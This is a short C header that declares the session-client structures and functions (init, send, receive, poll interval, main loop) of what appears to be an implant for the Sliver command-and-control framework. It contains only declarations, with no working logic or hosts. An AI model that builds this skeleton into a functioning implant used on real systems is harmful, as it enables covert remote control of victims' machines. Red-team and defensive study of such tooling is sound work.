#pragma once

struct _SLIVER_SESSION_CLIENT {
	PGLOBAL_CONFIG pGlobalConfig;
	LPVOID lpClient;
	CLIENT_INIT Init;
	CLIENT_START Start;
	CLIENT_SEND Send;
	CLIENT_RECV Receive;
	CLIENT_CLOSE Close;
	CLIENT_CLEANUP Cleanup;
	DWORD dwPollInterval;
};

struct _SESSION_WORK_WRAPPER {
	PSLIVER_SESSION_CLIENT pSession;
	PENVELOPE pEnvelope;
};

BOOL SesionRegister
(
	_In_ PSLIVER_SESSION_CLIENT pSession
);

VOID SessionMainLoop
(
	_In_ PSLIVER_SESSION_CLIENT pSession
);

VOID FreeSessionClient
(
	_In_ PSLIVER_SESSION_CLIENT pSession
);